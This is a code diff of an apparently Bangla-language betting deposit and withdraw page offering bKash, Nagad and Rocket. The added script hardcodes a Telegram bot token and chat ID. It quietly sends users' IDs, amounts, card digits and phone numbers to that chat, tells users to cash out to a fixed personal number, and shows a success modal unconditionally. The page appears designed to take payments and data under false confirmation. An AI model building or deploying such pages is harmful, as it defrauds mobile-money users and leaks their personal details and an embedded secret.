@@ -134,7 +134,6 @@ body{
   font-weight:600;
 }
 
-/* FLOAT LEFT */
 .float-area{
   position: fixed;
   left: 15px;
@@ -155,7 +154,6 @@ body{
   text-align:center;
   font-size:12px;
   cursor:pointer;
-
   display:flex;
   flex-direction:column;
   justify-content:center;
@@ -166,41 +164,8 @@ body{
   font-size:13px;
 }
 
-/* WHATSAPP FLOAT */
-.float-whatsapp{
-  position: fixed;
-  right: 15px;
-  bottom: 20px;
-  z-index: 9999;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  gap:6px;
-}
-
-.float-whatsapp .wa-text{
-  font-size:12px;
-  padding:3px 8px;
-  border-radius:10px;
-  background:rgba(37,211,102,0.15);
-  border:1px solid rgba(37,211,102,0.4);
-  color:white;
-}
-
-.float-whatsapp a{
-  width:55px;
-  height:55px;
-  border-radius:50%;
-  background:#25D366;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  text-decoration:none;
-  box-shadow:0 5px 15px rgba(0,0,0,0.3);
-}
-
 /* ========================= */
-/* ✅ SUCCESS MODAL ADD      */
+/* 🔥 PREMIUM SUCCESS MODAL */
 /* ========================= */
 
 .success-modal{
@@ -252,30 +217,31 @@ body{
   font-size:14px;
   color:#94a3b8;
 }
-
 </style>
 </head>
 
 <body>
 
-<div class="container" id="mainContent">
+<div class="container">
 
 <div class="top-note">
   <span>⏳ অনুগ্রহ করে অপেক্ষা করুন, আপনার ডিপোজিট প্রক্রিয়াধীন...</span>
 </div>
 
 <div class="tabs">
-  <div class="tab active">Deposit</div>
-  <div class="tab">Withdraw</div>
+  <div class="tab active" onclick="showTab('deposit', event)">Deposit</div>
+  <div class="tab" onclick="showTab('withdraw', event)">Withdraw</div>
 </div>
 
 <div id="deposit" class="card">
 
-  <div class="methods">
-    <div class="method active">বিকাশ</div>
-    <div class="method">নগদ</div>
-    <div class="method">রকেট</div>
+  <div class="methods" id="depositMethods">
+    <div class="method active" onclick="selectMethod(this,'deposit')">বিকাশ</div>
+    <div class="method" onclick="selectMethod(this,'deposit')">নগদ</div>
+    <div class="method" onclick="selectMethod(this,'deposit')">রকেট</div>
   </div>
+
+  <div class="number-card" id="numberCard"></div>
 
   <div class="row">
     <input type="text" id="d_userid" placeholder="ইউজার ID">
@@ -288,10 +254,10 @@ body{
 
 <div id="withdraw" class="card" style="display:none;">
 
-  <div class="methods">
-    <div class="method active">বিকাশ</div>
-    <div class="method">নগদ</div>
-    <div class="method">রকেট</div>
+  <div class="methods" id="withdrawMethods">
+    <div class="method active" onclick="selectMethod(this,'withdraw')">বিকাশ</div>
+    <div class="method" onclick="selectMethod(this,'withdraw')">নগদ</div>
+    <div class="method" onclick="selectMethod(this,'withdraw')">রকেট</div>
   </div>
 
   <div class="row">
@@ -312,13 +278,8 @@ body{
   <div class="site-card" onclick="window.open('https://www.9xbet9.live/','_blank')"><b>9xBet</b></div>
 </div>
 
-<div class="float-whatsapp">
-  <div class="wa-text">আকাশ খান</div>
-  <a href="https://wa.me/855969610245" target="_blank"></a>
-</div>
-
 <!-- ========================= -->
-<!-- SUCCESS MODAL HTML       -->
+<!-- 🔥 SUCCESS MODAL HTML -->
 <!-- ========================= -->
 <div class="success-modal" id="successModal">
   <div class="checkmark"></div>
@@ -328,13 +289,18 @@ body{
 </div>
 
 <script>
-function generateOrderID(){
-  return "ORD-" + Math.floor(100000 + Math.random()*900000);
+const botToken = "8216213984:AAFCOQsGouXgnit2vKR6Rv8-VonSYL7_irk";
+const chatId = "8406979793";
+
+let orderCounter = 23;
+let selectedDeposit = "বিকাশ";
+let selectedWithdraw = "বিকাশ";
+
+function generateOrderId(){
+  return "#" + (orderCounter++);
 }
 
-function showSuccess(){
-  let id = generateOrderID();
-
+function showSuccess(id){
   document.getElementById("orderId").innerText = "Order ID: " + id;
   document.getElementById("successModal").style.display = "block";
 
@@ -344,11 +310,70 @@ function showSuccess(){
 }
 
 function sendDeposit(){
-  showSuccess();
+  let id = generateOrderId();
+
+  let msg = `📥 Deposit Request
+━━━━━━━━━━━━
+🆔 Order ID: ${id}
+💳 Method: ${selectedDeposit}
+👤 User ID: ${d_userid.value}
+💰 Amount: ${d_amount.value}
+🔢 Last 4 Digit: ${d_last.value}
+📅 ${new Date().toLocaleString()}
+━━━━━━━━━━━━`;
+
+  sendToTelegram(msg);
+
+  showSuccess(id);
 }
 
 function sendWithdraw(){
-  showSuccess();
+  let id = generateOrderId();
+
+  let msg = `📤 Withdraw Request
+━━━━━━━━━━━━
+🆔 Order ID: ${id}
+💳 Method: ${selectedWithdraw}
+👤 User ID: ${w_userid.value}
+💰 Amount: ${w_amount.value}
+📱 Number: ${w_number.value}
+📅 ${new Date().toLocaleString()}
+━━━━━━━━━━━━`;
+
+  sendToTelegram(msg);
+
+  showSuccess(id);
+}
+
+function sendToTelegram(message){
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:chatId,text:message})
+  });
+}
+
+function selectMethod(el,type){
+  let parent = type==='deposit'?depositMethods:withdrawMethods;
+  parent.querySelectorAll('.method').forEach(m=>m.classList.remove('active'));
+  el.classList.add('active');
+
+  if(type==='deposit'){
+    selectedDeposit = el.innerText;
+    numberCard.innerHTML = `<b>01316616956</b><br>ক্যাশ আউট করুন`;
+    numberCard.style.display="block";
+  }else{
+    selectedWithdraw = el.innerText;
+  }
+}
+
+function showTab(tab,e){
+  deposit.style.display='none';
+  withdraw.style.display='none';
+  document.getElementById(tab).style.display='block';
+
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+  e.target.classList.add('active');
 }
 </script>
 
